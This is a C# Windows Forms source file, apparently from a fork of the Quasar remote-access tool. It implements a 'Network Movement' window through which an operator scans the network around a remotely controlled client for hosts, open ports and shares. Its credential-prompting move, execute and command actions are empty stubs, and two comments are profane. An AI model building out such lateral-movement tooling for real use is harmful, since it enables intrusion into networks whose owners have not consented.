using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Messages.Network;
using Quasar.Common.Models.Network;
// Custom
using Quasar.Common.Models;
using Quasar.Server.Controls;
using Quasar.Server.Forms.DarkMode;
using Quasar.Server.Helper;
using Quasar.Server.Messages;
using Quasar.Server.Networking;

using System;
using System.ComponentModel;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Linq;

namespace Quasar.Server.Forms
{
    public partial class FrmNetworkMovement : Form
    {
        /// <summary>
        /// The client which can be used for the network movement.
        /// </summary>
        private readonly Client _connectClient;

        private readonly NetworkHandler _networkHandler;

        private BindingList<InterfaceBoxItem> _interfaceItems = new BindingList<InterfaceBoxItem>();
        private BindingList<EntityListItem> _networkEntities = new BindingList<EntityListItem>();

        /// <summary>
        /// Holds the opened network movement form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmNetworkMovement> OpenedForms = new Dictionary<Client, FrmNetworkMovement>();

        /// <summary>
        /// Creates a new network movement form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the network movement form.</param>
        /// <returns>
        /// Returns a new network movement form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmNetworkMovement CreateNewOrGetExisting(Client client)
        {
                if (OpenedForms.ContainsKey(client))
                {
                    return OpenedForms[client];
                }
                FrmNetworkMovement f = new FrmNetworkMovement(client);
                f.Disposed += (sender, args) => OpenedForms.Remove(client);
                OpenedForms.Add(client, f);
                return f;
        }

        public FrmNetworkMovement(Client client)
        {
            _connectClient = client;
            _networkHandler = new NetworkHandler(client);

            RegisterMessageHandler();
            InitializeComponent();

            cmbInterfaces.DataSource = _interfaceItems;
            _networkEntities.ListChanged += NetworkEntitiesListChanged;

            DarkModeManager.ApplyDarkMode(this);
        }

        private void NetworkEntitiesListChanged(object sender, ListChangedEventArgs e)
        {
            lstNetworkEntities.BeginUpdate();
            lstNetworkEntities.Items.Clear();
            foreach (EntityListItem obj in _networkEntities)
            {
                ListViewItem item = obj.toItem();
                lstNetworkEntities.Items.Add(item);
            }
            lstNetworkEntities.EndUpdate();
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _networkHandler.NetworkScanResponseEvent += NetworkEntitiesChanged;
            _networkHandler.NetworkScanProgressEvent += ScanProgressChanged;
            _networkHandler.InterfaceScanResponseEvent += InterfaceEntitiesChanged;
            MessageHandler.Register(_networkHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_networkHandler);
            _networkHandler.InterfaceScanResponseEvent -= InterfaceEntitiesChanged;
            _networkHandler.NetworkScanProgressEvent -= ScanProgressChanged;
            _networkHandler.NetworkScanResponseEvent -= NetworkEntitiesChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void NetworkEntitiesChanged(object sender, NetworkScanResponseEventArgs args)
        {
            EntityListItem instance = _networkEntities.Where(item => item.address.Address == args.Packet.Address.Address && item.nic.Name == args.Packet.Interface.Name).FirstOrDefault();
            try
            {
                if (instance != null)
                {
                    _networkEntities.Remove(instance);
                }
                _networkEntities.Add(new EntityListItem { Result = args.Packet.Result, FailureReason = args.Packet.FailureReason, address = args.Packet.Address, nic = args.Packet.Interface });
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void InterfaceEntitiesChanged(object sender, InterfaceScanResponseEventArgs args)
        {
            _interfaceItems.Clear();
            if (args.Packet.Interfaces.Length == args.Packet.PotentialIps.Length)
            {
                for (int i = 0; i < args.Packet.Interfaces.Length; i++)
                {
                    _interfaceItems.Add(new InterfaceBoxItem { entity = args.Packet.Interfaces[i], potentialIps = args.Packet.PotentialIps[i] });
                }
            }
            else
            {
                foreach (InterfaceEntity nic in args.Packet.Interfaces)
                {
                    _interfaceItems.Add(new InterfaceBoxItem { entity = nic, potentialIps = -1 });
                }
            }
        }

        private void ScanProgressChanged(object sender, NetworkScanProgressEventArgs args)
        {
            //This technically has a bug where users can start 2 scans, which then fucks the progress view
            //But you only have to fix that if we have some STUPID fucking users.
            if (args.Packet.Address != null && args.Packet.NIC != null)
            {
                EntityListItem instance = _networkEntities.Where(item => item.address.Address == args.Packet.Address.Address && item.nic.Name == args.Packet.NIC.Name).FirstOrDefault();
                if (instance != null)
                {
                    int location = _networkEntities.IndexOf(instance);
                    if (args.Packet.ScanningPorts)
                    {
                        _networkEntities[location].ScanningPorts = true;
                        _networkEntities[location].CurrentPort = args.Packet.CurrentPort;
                    }
                    else
                    {
                        _networkEntities[location].ScanningPorts = false;
                        _networkEntities[location].CurrentPort = 0;
                    }
                    if (args.Packet.ScanningShares)
                    {
                        _networkEntities[location].ScanningShares = true;
                    }
                    else
                    {
                        _networkEntities[location].ScanningShares = false;
                    }
                    ListViewItem item = lstNetworkEntities.Items.Cast<ListViewItem>().FirstOrDefault(s => s.Text == args.Packet.NIC.Name && s.SubItems.Count > 1 && s.SubItems[1].Text == args.Packet.Address.Address);
                    if (item != null)
                    {
                        int listLocation = lstNetworkEntities.Items.IndexOf(item);
                        bool wasSelected = item.Selected;
                        ListViewItem newItem = instance.toItem();
                        lstNetworkEntities.BeginUpdate();
                        lstNetworkEntities.Items[listLocation].Text = newItem.Text;
                        for (int i = 0; i < lstNetworkEntities.Items[listLocation].SubItems.Count; i++)
                        {
                            if (i < lstNetworkEntities.Items[listLocation].SubItems.Count)
                            {
                                lstNetworkEntities.Items[listLocation].SubItems[i] = newItem.SubItems[i];
                            }
                        }
                        lstNetworkEntities.Items[listLocation].Selected = wasSelected;
                        lstNetworkEntities.EndUpdate();
                        if (lstNetworkEntities.InvokeRequired)
                        {
                            lstNetworkEntities.BeginInvoke((MethodInvoker)delegate
                            {
                                //Redraw's dont have darkmode. Fix that
                                lstNetworkEntities.RedrawItems(listLocation, listLocation, false);
                            });
                        }
                        else
                        {
                            lstNetworkEntities.RedrawItems(listLocation, listLocation, false);
                        }
                    }
                }
            }
            else if (args.Packet.Addresses <= 0)
            {
                if (statusStrip.InvokeRequired)
                {
                    statusStrip.BeginInvoke((MethodInvoker)delegate
                    {
                        toolStripProgress.Text = "Status: Idle...";
                    });
                }
                else
                {
                    toolStripProgress.Text = "Status: Idle...";
                }
            }
            else
            {
                double progressPercentage = 100 - (((double)args.Packet.CurrentAddress / args.Packet.Addresses) * 100);
                string progressText = Math.Round(progressPercentage, 2).ToString("F2");

                if (statusStrip.InvokeRequired)
                {
                    statusStrip.BeginInvoke((MethodInvoker)delegate
                    {
                        toolStripProgress.Text = $"Status: Scanning {args.Packet.Addresses} IPs... ({progressText}% Complete)";
                    });
                }
                else
                {
                    toolStripProgress.Text = $"Status: Scanning {args.Packet.Addresses} IPs... ({progressText}% Complete)";
                }
            }
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void FrmNetworkMovement_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Network Movement", _connectClient);
            _networkHandler.RefreshInterfaces();
        }

        private void toolStripMoveItem_Click(object sender, EventArgs e)
        {
            string username = string.Empty;
            string password = string.Empty;
            string command = string.Empty;
            if (InputBox.Show("Username", "Enter Username:", ref username) == DialogResult.OK &&
                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK)
            {

            }
        }

        private void toolStripExecuteItem_Click(object sender, EventArgs e)
        {
            string username = string.Empty;
            string password = string.Empty;
            string command = string.Empty;
            if (InputBox.Show("Username", "Enter Username:", ref username) == DialogResult.OK &&
                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK)
            {

            }
        }

        private void toolStripCommandItem_Click(object sender, EventArgs e)
        {
            string username = string.Empty;
            string password = string.Empty;
            string command = string.Empty;
            if (InputBox.Show("Username", "Enter Username:", ref username) == DialogResult.OK &&
                InputBox.Show("Password", "Enter Password:", ref password) == DialogResult.OK &&
                InputBox.Show("Command", "Enter Command:", ref command) == DialogResult.OK)
            {

            }
        }

        private void toolStripRefreshItem_Click(object sender, EventArgs e)
        {
            lstNetworkEntities.Items.Clear();
            _networkHandler.RefreshInterfaces();
        }

        private void FrmNetworkMovement_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _networkEntities.ListChanged -= NetworkEntitiesListChanged;
        }

        private void btnInterfaceRefresh_Click(object sender, EventArgs e)
        {
            _networkHandler.RefreshInterfaces();
        }

        private void btnScan_Click(object sender, EventArgs e)
        {
            _networkHandler.RefreshEntities((cmbInterfaces.SelectedItem as InterfaceBoxItem).entity);
        }
    }

    public class InterfaceBoxItem
    {
        public InterfaceEntity entity { get; set; }
        public int potentialIps { get; set; }
        public override string ToString()
        {
            return entity.Name + (potentialIps > -1 ? $" ({potentialIps} IPs)" : "");
        }
    }

    public class EntityListItem
    {
        public AddressEntity address { get; set; }

        public InterfaceEntity nic { get; set; }

        public bool Result { get; set; }

        public string FailureReason { get; set; }

        public bool ScanningPorts { get; set; }

        public bool ScanningShares { get; set; }

        public int CurrentPort { get; set; }

        public ListViewItem toItem()
        {
            ListViewItem lvi = new ListViewItem();
            lvi.Text = nic.Name.ToString();
            lvi.SubItems.Add(address.Address.ToString());
            if (address.Ports == null || address.Ports.Length < 1)
            {
                lvi.SubItems.Add("");
            }
            else
            {
                lvi.SubItems.Add(string.Join(", ", address.Ports));
            }
            if (address.Shares == null || address.Shares.Length < 1)
            {
                lvi.SubItems.Add("");
            }
            else
            {
                List<string> shares = address.Shares.Select(s => $"{s.ShareName} ({(s.RequiresCredentials ? "🔒" : "")})").ToList();
                lvi.SubItems.Add(string.Join(", ", shares));
            }
            if (ScanningPorts || ScanningShares)
            {
                if (CurrentPort > 0)
                {
                    double percentage = ((double)CurrentPort / 65535) * 100;
                    lvi.SubItems.Add($"Scanning Ports ({CurrentPort} / 65535)... ({Math.Round(percentage, 2).ToString("F2")}% Completed)");
                }
                else if (ScanningShares)
                {
                    lvi.SubItems.Add($"Scanning Shares...");
                }
            }
            else
            {
                lvi.SubItems.Add("Idle...");
            }
            return lvi;
        }

    }
}
